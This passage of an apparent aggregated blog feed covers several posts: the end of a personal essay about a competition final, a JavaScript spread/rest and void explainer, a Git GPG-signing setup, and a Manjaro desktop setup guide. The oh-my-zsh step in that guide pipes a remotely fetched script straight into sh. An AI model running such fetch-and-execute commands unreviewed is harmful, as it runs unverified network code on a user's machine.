没有人能在我想问问题的时候，喝着清补凉给我答疑解惑了。</p><p>冬天，北京，牡丹园。每年的北京都是那么冷，每个地名也都有属于它的说不尽的故事。铁三决赛在北航，早上我们走路过去，瑟瑟的清晨路边是匆匆上下班的男男女女。我没有再丢一次键盘，完赛，第6。对大多数大学生来说，全国第6也不丢人了，对我来说不管怎么样，剑我已经把它硬接下来，耻辱退役也算是给自己一个交代了。</p><p>阴差阳错也是，也正是在牡丹园如家，我完成了腾讯的2面3面，头上又换上了另一把剑。那天晚上的奥体路口风特别大，拉着手的情侣都看不到，我一个人带着他仨都没有的大手套大帽子，自己在路口冷静。如果算起来，那个时间就算是the beginning of the end</p><p>之后的日子里，我开始尽量把自己的名字和南航的名字分开，寻找真正的自己。当然现在看起来我似乎是一败涂地。</p><p>不管怎么样，以此，感谢所有支持过我，帮助过我，曾经是我的队友和对手的人，神仙cp和纸飞机的大大小小老老少少的小伙伴们，Asuri的男男男男男嬲们，学校里所有正义执严的人儿们，厂里和我一起加班的男工女工们。</p>]]></content>
        <author>
            <name><![CDATA[善良单纯的板の窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://yuwenjie.cc/2019-dotdotdot.html</id>
        <title><![CDATA[从 arrow function 到 rest/spread syntax 到 void 到 IIFE]]></title>
        <updated>2019-09-15T07:34:17+08:00</updated>
        <link href="https://yuwenjie.cc/2019-dotdotdot.html"/>
        <content type="text/html" src="https://yuwenjie.cc/2019-dotdotdot.html"><![CDATA[<p>mdn 中，把 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax"><code>spread syntax</code></a> 翻译作 <code>展开语法</code>，我们有时候会叫 <code>展开表达式</code>， 甚至直接读 <code>点点点</code>，它同 <code>arrow function</code> 已经是被普遍地使用和普遍地做为面试题的东西了。</p><p>用法可以说已经深入骨髓了</p><pre><code class="lang-js">const a = [42, 1729]
const b = [...a, ...a]
const f = (x, y) =&gt; x + y
f(...a)</code></pre><p>在这种“正常”的用法中，我们用 <code>...</code> 弹出了数组(iterable)的元素，使之可以被分割和拼接。</p><p>然后今天在读 mdn 的时候注意到了这段内容</p><blockquote><p>Arrow functions do not have their own arguments object. Thus, in this example, arguments is simply a reference to the arguments of the enclosing scope:</p><p>In most cases, using rest parameters is a good alternative to using an arguments object.</p></blockquote><pre><code class="lang-js">function foo(n) { 
  var f = (...args) =&gt; args[0] + n;
  return f(10); 
}

foo(1); // 11</code></pre><p>似乎不好理解 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/rest_parameters">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/rest_parameters</a></p><pre><code class="lang-js">function myFun(a, b, ...manyMoreArgs) {
  console.log(&quot;a&quot;, a); 
  console.log(&quot;b&quot;, b);
  console.log(&quot;manyMoreArgs&quot;, manyMoreArgs); 
}

myFun(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;, &quot;four&quot;, &quot;five&quot;, &quot;six&quot;);</code></pre><p>例中给的也是常用的用法。</p><p>但是两个常用放在在一起，是不是有一种...套娃的感觉？</p><p>如果</p><pre><code class="lang-js">function myFun(a, b, ...manyMoreArgs) {
    console.log(&quot;a&quot;, a); 
    console.log(&quot;b&quot;, b);
    console.log(&quot;manyMoreArgs&quot;, manyMoreArgs); 
}

const a = [42, 1729]
myFun(...a, ...a)

myFun(...[...a, ...a])//奇怪的写法</code></pre><p>写法二虽然看起来的多余的一层展开，但是似乎又是最符合函数原则的（整个包装，整个展开参数）。</p><p>我觉得，这奇怪的写法，只是因为又有人偷懒了，<code>rest</code> 和 <code>spread</code> 使用了同一符号。</p><p>两种语法其实是...毫无关系的。标准 <a href="https://www.ecma-international.org/ecma-262/6.0/#sec-array-initializer">https://www.ecma-international.org/ecma-262/6.0/#sec-array-initializer</a> 12.2.5</p><blockquote><p>SpreadElement[Yield] :</p><p>... AssignmentExpression[In, ?Yield]</p></blockquote><p>数组部分定义了元素弹出。</p><p>rest 方法仅可用于 function-definitions </p><p><a href="https://www.ecma-international.org/ecma-262/6.0/#sec-function-definitions">https://www.ecma-international.org/ecma-262/6.0/#sec-function-definitions</a></p><p><a href="https://www.ecma-international.org/ecma-262/6.0/#sec-function-definitions-static-semantics-expectedargumentcount">https://www.ecma-international.org/ecma-262/6.0/#sec-function-definitions-static-semantics-expectedargumentcount</a> 14.1.6</p><p>也就是说，仅能在函数声明的时候使用 rest，也就是弹“入”</p><p>emmmm 其实我在看 ecma 之前，也不懂其用意。先读<del>《情商》</del>，不是，拿错书，先读了 <del>《圣经》</del>，也不是，先读了《babel》</p><pre><code class="lang-js">const f = (...a) =&gt; {
    console.log(a)
}

f(...[42, 1792])
f(42)
f(42, 1792)</code></pre><p>=== <code>babel7 es2015</code> ===&gt;</p><pre><code class="lang-js">var f = function f() {
  for (var _len = arguments.length, a = new Array(_len), _key = 0; _key &lt; _len; _key++) {
    a[_key] = arguments[_key];
  }

  console.log(a);
};

f.apply(void 0, [42, 1792]);
f(42);
f(42, 1792); </code></pre><p>显而易见，只是把 <code>arguments</code> 压入，同时转换了箭头函数（这里其实是有问题的，因为...其实不 <strong>单纯</strong> 是一个 es6 的语法，es9 中对其对 iterable 的表现进行了修改，但是又不影响 reset 部分。因为箭头函数又没有 <code>arguments</code>，所以看起来也怪怪的）</p><pre><code class="lang-js">a = [1,2,3]
const b = [...a, ...a]</code></pre><p>=== <code>babel7 es2015</code> ===&gt;</p><pre><code class="lang-js">function _toConsumableArray(arr) {
    return _arrayWithoutHoles(arr) || _iterableToArray(arr) || _nonIterableSpread();
}

function _nonIterableSpread() {
    throw new TypeError(&quot;Invalid attempt to spread non-iterable instance&quot;);
}

function _iterableToArray(iter) {
    if (Symbol.iterator in Object(iter) || Object.prototype.toString.call(iter) === &quot;[object Arguments]&quot;) return Array.from(iter);
}

function _arrayWithoutHoles(arr) {
    if (Array.isArray(arr)) {
        for (var i = 0, arr2 = new Array(arr.length); i &lt; arr.length; i++) {
            arr2[i] = arr[i];
        }
        return arr2;
    }
}

a = [1, 2, 3];
var b = [].concat(_toConsumableArray(a), _toConsumableArray(a));</code></pre><p>一个判别拷贝（仅 es6 中的数组部分 并无 es9 中的对象展开）</p><p>很有意思的是，如果我们声明 <code>a</code>，会变成</p><pre><code class="lang-js">const a = [1,2,3]//这里声明
const b = [...a, ...a]</code></pre><p>=== <code>babel7 es2015</code> ===&gt;</p><pre><code class="lang-js">var a = [1, 2, 3];
var b = [].concat(a, a); </code></pre><p>emmmm，这个编译原理就是另一个故事了</p><p>关注点回到前边</p><pre><code class="lang-js">f.apply(void 0, [42, 1792]);</code></pre><p>babel 使用 <code>void operator</code> 生成 <code>undefined</code>，其实这也是我面试的时候回答 “null 和 undefined 的区别”的时候一个技巧23333。很多初学者其实并不了解 <code>undefined</code> 的价值（对于v8的性能优化和垃圾回收）（说得跟我多知道一样），不过这就是另一个故事了。我们说到箭头函数，大家不会用 <code>void</code> 的很重要的一点原因是.....这部分的mdn没有被翻译成中文，当然我写完这篇博客之后已经提交了中文翻译，好久没给 mdn 提东西了23333。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/void#Non-leaking_Arrow_Functions">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/void#Non-leaking_Arrow_Functions</a></p><blockquote><p>Non-leaking Arrow Functions</p></blockquote><pre><code class="lang-js">button.onclick = () =&gt; void doSomething();</code></pre><p>于是，就轻而易举的，扣到了题目。从箭头函数扯到了 js 的 <code>void</code>。</p><blockquote><p>Immediately Invoked Function Expressions</p></blockquote><p>提到了 <code>void</code> 就不得不提一下 IIFE</p><p>如 mdn 例</p><pre><code class="lang-js">void function iife() {
    var bar = function () {};
    var baz = function () {};
    var foo = function () {
        bar();
        baz();
     };
    var biz = function () {};

    foo();
    biz();
}();</code></pre><p>同样也是面试考点，闭包和 IIFE ，还有其他 <code>void</code> 的用处也不赘述了，mdn 有很好的解释和中文翻译2333，成功地又一次扣到标题，然后开心 ending 啦~</p>]]></content>
        <author>
            <name><![CDATA[善良单纯的板の窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/git-initialization/</id>
        <title><![CDATA[Git initialization]]></title>
        <updated>2019-09-01T10:37:13+08:00</updated>
        <link href="https://blog.triplez.cn/git-initialization/"/>
        <content type="text/html" src="https://blog.triplez.cn/git-initialization/"><![CDATA[<ul>
<li>Change <code>Git</code> default settings;</li>
<li>Use <code>GPG</code> key to sign the <code>Git</code> commits.</li>
</ul>
<h2>Step by step</h2>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git config --global core.editor "vim"


# config your identity
git config --global user.email "YOUR_EMAIL"
git config --global user.name "YOUR_NAME"

# enable gpg signed commit
git config --global commit.gpgsign true

# generate gpg key
## git &gt;= 2.1.17
gpg --full-generate-key
# or gpg --gen-key
## git &lt; 2.1.17
gpg --default-new-key-algo rsa4096 --gen-key

# check your key id
$ gpg --list-secret-keys --keyid-format LONG
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
/home/triplez/.gnupg/pubring.kbx
--------------------------------
sec   rsa4096/96B4168C3D454E11 2018-11-28 [SC]
      6B0B48B063F8F592CE9006DE96B4168C3D454E11
uid                 [ultimate] Zhenzhen Zhao (my gpg) &lt;me@triplez.cn&gt;
ssb   rsa4096/435B8EB04CBF8E8D 2018-11-28 [E]

gpg --armor --export 96B4168C3D454E11
# copy your GPG key, beginning with -----BEGIN PGP PUBLIC KEY BLOCK----- and ending with -----END PGP PUBLIC KEY BLOCK-----, then add it to the GitHub

# set user to sign with this gpg key
git config --global user.signingkey 96B4168C3D454E11
</code></pre>
<h2>References</h2>
<p><a href="https://help.github.com/articles/generating-a-new-gpg-key/">Generating a new GPG key</a><br />
<a href="https://stackoverflow.com/questions/52808365/git-error-gpg-failed-to-sign-the-data-on-linux">Git error: gpg failed to sign the data on Linux</a></p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/git-initialization/">Git initialization</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/manjaro-quick-start/</id>
        <title><![CDATA[将干净的 Manjaro 快速配置为工作环境]]></title>
        <updated>2019-08-26T14:58:12+08:00</updated>
        <link href="https://blog.triplez.cn/manjaro-quick-start/"/>
        <content type="text/html" src="https://blog.triplez.cn/manjaro-quick-start/"><![CDATA[<h2><span class="ez-toc-section" id="i">初始化配置</span></h2>
<p>先配置镜像源，Manjaro 早已帮我们安排好这一切：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-sh"># 选取当下在国内最快的源
$ sudo pacman-mirrors -i -c China -m rank
</code></pre>
<h3><span class="ez-toc-section" id="i-2">添加国内软件源</span></h3>
<p>修改 <code>/etc/pacman.conf</code> ，添加如下语句（此处使用清华 TUNA 源）：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-ini">[archlinuxcn]
SigLevel= TrustedOnly
Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch
</code></pre>
<blockquote><p>
  此处建议先 <code>sudo pacman -S vim</code>  😛
</p></blockquote>
<p>安装密钥：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -Syu archlinuxcn-keyring
</code></pre>
<blockquote><p>
  可能遇到 <strong>Unable to lock database</strong> 错误，<a href="https://forum.manjaro.org/t/solved-not-able-to-update-unable-to-lock-database/45077/4">解决方案</a>如下：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo rm /var/lib/pacman/db.lck
  </code></pre>
</blockquote>
<h3><span class="ez-toc-section" id="i-3">更新系统</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -Syyu
</code></pre>
<p>让 Manjaro 使用 LocalTime，解决与 Windows 共存主板时间冲突问题：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo timedatectl set-local-rtc true
</code></pre>
<h3><span class="ez-toc-section" id="i-4">必备工具</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S yay git net-tools tree vim
</code></pre>
<blockquote><p>
  <code>yay</code> 是 AUR 管理工具。
</p></blockquote>
<h3><span class="ez-toc-section" id="i-5">双显卡切换</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus
$ sudo systemctl enable bumblebeed
$ sudo gpasswd -a $USER bumblebee
</code></pre>
<h3><span class="ez-toc-section" id="Emoji_Support">Emoji Support</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S noto-fonts-emoji
</code></pre>
<h2><span class="ez-toc-section" id="i-6">科学上网</span></h2>
<p>这是最最最基础的需求！</p>
<h3><span class="ez-toc-section" id="Shadowsocks">Shadowsocks</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S shadowsocks-qt5
</code></pre>
<p>可以设为开机启动。</p>
<h3><span class="ez-toc-section" id="ShadowsocksR">ShadowsocksR</span></h3>
<p><a href="https://aur.archlinux.org/packages/electron-ssr/">electron-ssr (AUR)</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S electron-ssr
</code></pre>
<h3><span class="ez-toc-section" id="Proxychains">Proxychains</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S proxychains-ng
</code></pre>
<h2><span class="ez-toc-section" id="i-7">日常软件</span></h2>
<h3><span class="ez-toc-section" id="i-8">搜狗输入法</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S fcitx fcitx-qt4 fcitx-im  fcitx-configtool fcitx-sogoupinyin
</code></pre>
<p>设置 <code>fcitx</code> 为默认输入法，编辑 <code>~/.xprofile</code> ：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-shell">export GTK_IM_MODULE=fcitx
export QT_IM_MODULE=fcitx
export XMODIFIERS=@im=fcitx
</code></pre>
<p>安装必备字体：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S wqy-bitmapfont wqy-microhei \
  wqy-zenhei adobe-source-code-pro-fonts \
  adobe-source-han-sans-cn-fonts ttf-monaco
</code></pre>
<p>我最爱的皮肤：<a href="https://pinyin.sogou.com/skins/detail/view/info/430641">黑色科技</a></p>
<h3><span class="ez-toc-section" id="RIME">RIME</span></h3>
<p>RIME 中州韵输入法是 Linux 下广受好评的中文输入法。鉴于搜狗输入法的 bug 不断（QT4），笔者更推荐 RIME 来作为中文输入法。</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S fcitx-rime fcitx-cloudpinyin fcitx-googlepinyin
</code></pre>
<h3><span class="ez-toc-section" id="Telegram">Telegram</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S telegram-desktop
</code></pre>
<h3><span class="ez-toc-section" id="Dropbox">Dropbox</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S dropbox
</code></pre>
<h3><span class="ez-toc-section" id="i-9">坚果云</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S nutstore
</code></pre>
<h3><span class="ez-toc-section" id="Typora">Typora</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S typora
</code></pre>
<h3><span class="ez-toc-section" id="oh-my-zsh">oh-my-zsh</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S zsh
$ sh -c "$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
</code></pre>
<p>安装插件：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git clone https://github.com/zsh-users/zsh-completions ~/.oh-my-zsh/custom/plugins/zsh-completions

$ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/plugins/zsh-syntax-highlighting

$ git clone https://github.com/zsh-users/zsh-autosuggestions.git ~/.oh-my-zsh/plugins/zsh-autosuggestions

$ vim ~/.zshrc
  # edit plugins &amp; save
  plugins=(git zsh-syntax-highlighting docker docker-compose zsh-autosuggestions zsh-completions)

$ autoload -U compinit &amp;&amp; compinit
</code></pre>
<h3><span class="ez-toc-section" id="Google_Chrome">Google Chrome</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S google-chrome
</code></pre>
<h3><span class="ez-toc-section" id="i-10">网易云音乐</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S netease-cloud-music
</code></pre>
<h3><span class="ez-toc-section" id="MailSpring">MailSpring</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S mailspring
$ sudo pacman -S libsecret
</code></pre>
<h3><span class="ez-toc-section" id="TIM">TIM</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-wine-tim
</code></pre>
<p>设置 DPI（高分屏）：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ env WINEPREFIX="$HOME/.deepinwine/Deepin-TIM" winecfg
</code></pre>
<p>在 <code>Graphics</code> 中将 DPI 调整为 <code>120</code> 。</p>
<h3><span class="ez-toc-section" id="WeChat">WeChat</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-wine-wechat
</code></pre>
<p>设置 DPI（高分屏）：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ env WINEPREFIX="$HOME/.deepinwine/Deepin-WeChat" winecfg
</code></pre>
<p>在 <code>Graphics</code> 中将 DPI 调整为 <code>120</code> 。</p>
<h3><span class="ez-toc-section" id="Thunder_Speed">Thunder Speed (迅雷)</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-wine-thunderspeed
</code></pre>
<h3><span class="ez-toc-section" id="uGet_Aria2">uGet &amp; Aria2</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S uget aria2
</code></pre>
<blockquote><p>
  将 <code>uGet -&gt; Edit -&gt; Settings -&gt; Plug-in</code> 中的设置设为 aria2 。
</p></blockquote>
<h3><span class="ez-toc-section" id="WPS">WPS</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S ttf-wps-fonts
$ sudo pacman -S wps-offitce
</code></pre>
<h3><span class="ez-toc-section" id="Redshift_Night_light">Redshift (Night light)</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S redshift
</code></pre>
<h3><span class="ez-toc-section" id="Screenshot">Screenshot</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-screenshot
</code></pre>
<h2><span class="ez-toc-section" id="i-11">开发环境</span></h2>
<h3><span class="ez-toc-section" id="Vim">Vim</span></h3>
<p>我是 Vim 党。</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime
$ sh ~/.vim_runtime/install_awesome_vimrc.sh
</code></pre>
<h3><span class="ez-toc-section" id="Git">Git</span></h3>
<p>在之前我们已经安装过了 Git，这里主要是一些 Git 的基本设置：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git config --global user.name "Your_username"
$ git config --global user.email "your@email.com"
$ git config --global core.editor vim  # 使用 Vim 来编辑 Git 提交信息
</code></pre>
<blockquote><p>
  不要忘记添加生成并添加 GPG key 喔～
</p></blockquote>
<h3><span class="ez-toc-section" id="Docker">Docker</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S docker
$ sudo pacman -S docker-compose
</code></pre>
<h3><span class="ez-toc-section" id="Java">Java</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Java">Java - ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S java-runtime-common java-environment-common
$ yay jdk8  # Select extra/jdk8-openjdk
</code></pre>
<p>使用 <code>archlinux-java</code> 命令来管理 Java 环境。</p>
<p>列举 Java 环境：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ archlinux-java status
</code></pre>
<p>选择 Java 环境：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo archlinux-java set java-8-openjdk
</code></pre>
<h3><span class="ez-toc-section" id="Go">Go</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Go">Go - ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S go go-tools
</code></pre>
<blockquote><p>
  可选用 <code>gcc-go</code> ，但若需要使用 JetBrains 的 IDE 则必须使用 <code>go</code> ，否则 IDE 无法在 <code>/usr/lib/go</code> 下找到 Go SDK。
</p></blockquote>
<p>配置环境变量 <code>GOPATH</code> ，个人偏好在用户目录下的 <code>go/</code> 文件夹放置 Go 相关文件。</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ vim ~/.zshrc  # OR ~/.bashrc OR ~/.profile

export GOPATH=~/go
export PATH=$PATH:$GOPATH/bin
</code></pre>
<p>由于某些特殊的原因，国内无法很好地拉取 Go 相关的软件包。建议使用 <a href="https://github.com/goproxy/goproxy.cn">goproxy/goproxy.cn</a> ，只需在拉取前输入：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ export GOPROXY=https://goproxy.cn
</code></pre>
<h3><span class="ez-toc-section" id="MariaDB">MariaDB</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/MariaDB">MariaDB- ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S mariadb
# install MariaDB
$ sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
# start MariaDB
$ sudo systemctl start mariadb
# config MariaDB using interactive wizard
$ sudo mysql_secure_installtion
</code></pre>
<p>更改默认编码为 <code>utf8mb4</code> ：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-ini">$ sudo vim /etc/my.cnf

# append following lines
[client]
default-character-set = utf8mb4

[mysqld]
collation_server = utf8mb4_unicode_ci
character_set_server = utf8mb4

[mysql]
default-character-set = utf8mb4
</code></pre>
<p>重启 <code>MariaDB</code> 以生效。</p>
<h3><span class="ez-toc-section" id="Redis">Redis</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Redis">Redis - ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S redis
$ sudo systemctl start redis
</code></pre>
<h3><span class="ez-toc-section" id="Visual_Studio_Code">Visual Studio Code</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Visual_Studio_Code">Visual Studio Code - ArchWiki</a></p>
<p>宇宙第一编辑器！</p>
<p>可以使用 Snapd 来安装，见<a href="https://snapcraft.io/install/code/manjaro">这里</a>。不过笔者直接用 <code>pacman</code> 安装了，如下：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S visual-studio-code-bin
</code></pre>
<h3><span class="ez-toc-section" id="Sublime_Text">Sublime Text</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S sublime-text-dev
</code></pre>
<h3><span class="ez-toc-section" id="JetBrains_Toolbox">JetBrains Toolbox</span></h3>
<p><a href="https://aur.archlinux.org/packages/jetbrains-toolbox/">AUR - JetBrains Toolbox</a></p>
<p>JetBrains 家的 IDE 一应俱全，应有尽有！</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S jetbrains-toolbox
# $ sudo pacman -S intellij-idea-ultimate-edition
</code></pre>
<h3><span class="ez-toc-section" id="Postman">Postman</span></h3>
<p>后端开发必备。</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S postman
</code></pre>
<h2><span class="ez-toc-section" id="KDE">KDE 插件</span></h2>
<ul>
<li>Resource Monitor</p>
</li>
<li>
<p>Netspeed Widget</p>
</li>
<li>
<p>Redshift-control</p>
</li>
<li>
<p>Active Window Control</p>
</li>
<li>
<p>Global Menu</p>
</li>
<li>
<p>Latte Dock</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S latte-dock
</code></pre>
</li>
</ul>
<h2><span class="ez-toc-section" id="KDE-2">KDE 设置</span></h2>
<p>个人喜欢的桌面设置。</p>
<h3><span class="ez-toc-section" id="Displays">Displays</span></h3>
<p>屏幕 120% 放大： <code>System Settings &gt; Displays &gt; Scale Display &gt; 1.2</code> 。</p>
<h3><span class="ez-toc-section" id="Global_Menu">Global Menu</span></h3>
<p>因为有了 Latte Dock，不再需要任务栏了，取而代之的是全局菜单。需要添加 <code>Global Menu</code> 的 Widget。</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S appmenu-gtk-module
$ sudo pacman -S libdbusmenu-glib  # For electron apps menu
</code></pre>
<p>详情见<a href="https://forum.manjaro.org/t/gtk-global-menu-in-plasma-5-13/42112">此贴</a> 。</p>
<h3><span class="ez-toc-section" id="Screen_Locking">Screen Locking</span></h3>
<p><code>System Settings &gt; Desktop Behavior &gt; Screen Locking &gt; Keyboard Shortcut</code> 设为 <code>Meta + L</code> 。</p>
<h3><span class="ez-toc-section" id="Effects">Effects</span></h3>
<p>KDE 桌面动画效果。</p>
<p><code>System Settings &gt; Workspace Behavior &gt; Desktop Effects &gt; Configure Desktop Effects</code> ，设置你喜欢的桌面效果。</p>
<h3><span class="ez-toc-section" id="Window_Effects">Window Effects</span></h3>
<p>窗口切换效果：<code>System Settings &gt; Window Management &gt; Task Switcher &gt; Main &gt; Visualization</code> ，建议使用 <code>Large Icons</code> 。</p>
<h3><span class="ez-toc-section" id="Open_Files">Open Files</span></h3>
<p>KDE 默认是单击打开文件，但是用习惯 Windows 及 GNOME 的我不是很习惯，遂改之：</p>
<p><code>System Settings &gt; Desktop Behavior &gt; Workspace &gt; Click Behavior &gt; Double-Click to open files and folders(single click to select)</code> .</p>
<h3><span class="ez-toc-section" id="Shortcuts">Shortcuts</span></h3>
<h4><span class="ez-toc-section" id="Global_Shortcuts">Global Shortcuts</span></h4>
<p><code>System Settings &gt; Shortcuts &gt; Global Shortcuts &gt; KWin</code></p>
<table>
<thead>
<tr>
<th align="left">Action</th>
<th align="left">Global</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">Switch One Desktop Down</td>
<td align="left">Meta+Ctrl+Down</td>
</tr>
<tr>
<td align="left">Switch One Desktop to the Left</td>
<td align="left">Meta+Ctrl+Left</td>
</tr>
<tr>
<td align="left">Switch One Desktop to the Right</td>
<td align="left">Meta+Ctrl+Right</td>
</tr>
<tr>
<td align="left">Switch One Desktop Up</td>
<td align="left">Meta+Ctrl+Up</td>
</tr>
<tr>
<td align="left">Window One Desktop Down</td>
<td align="left">Meta+Ctrl+Shift+Down</td>
</tr>
<tr>
<td align="left">Window One Desktop to the Left</td>
<td align="left">Meta+Ctrl+Shift+Left</td>
</tr>
<tr>
<td align="left">Window One Desktop to the Right</td>
<td align="left">Meta+Ctrl+Shift+Right</td>
</tr>
<tr>
<td align="left">Window One Desktop Up</td>
<td align="left">Meta+Ctrl+Shift+Up</td>
</tr>
<tr>
<td align="left">Maximize Window</td>
<td align="left">Meta+Up</td>
</tr>
<tr>
<td align="left">Minimize Windows</td>
<td align="left">Meta+Down</td>
</tr>
</tbody>
</table>
<p><code>System Settings &gt; Shortcuts &gt; Global Shortcuts &gt; Plasma</code></p>
<table>
<thead>
<tr>
<th align="left">Action</th>
<th align="left">Global</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">Open Klipper at Mouse Position</td>
<td align="left">Alt+D</td>
</tr>
</tbody>
</table>
<h4><span class="ez-toc-section" id="Custom_Shortcuts">Custom Shortcuts</span></h4>
<p><code>System Settings &gt; Shortcuts &gt; Custom Shortcuts &gt; Edit</code></p>
<p>Deepin Screenshot 截屏快捷键：</p>
<ul>
<li><code>New &gt; Global Shortcut &gt; Command/URL</code> 新建全局自定义快捷键</li>
<li><code>Trigger</code> ： <code>Ctrl</code> + <code>Alt</code> + <code>A</code> </li>
<li><code>Action</code> ： <code>deepin-turbo-invoker --type=dtkwidget deepin-screenshot --icon</code> </li>
</ul>
<h3><span class="ez-toc-section" id="Desktop_Folder_Settings">Desktop Folder Settings</span></h3>
<p><code>Right click on Desktop &gt; Configure Desktop... &gt; Mouse Actions</code></p>
<p>删除 <code>Vertical-Scroll</code> 条目（取消滚动切换工作区）。</p>
<h2><span class="ez-toc-section" id="i-12">主题</span></h2>
<h3><span class="ez-toc-section" id="Adapta">Adapta</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S adapta-kde kvantum-theme-adapta adapta-gtk-theme
</code></pre>
<h2><span class="ez-toc-section" id="References">References</span></h2>
<ul>
<li><a href="https://yqsas.com/2019/03/03/manjaro-in-t480s/">折腾之 Manjaro 安装使用指北</a></li>
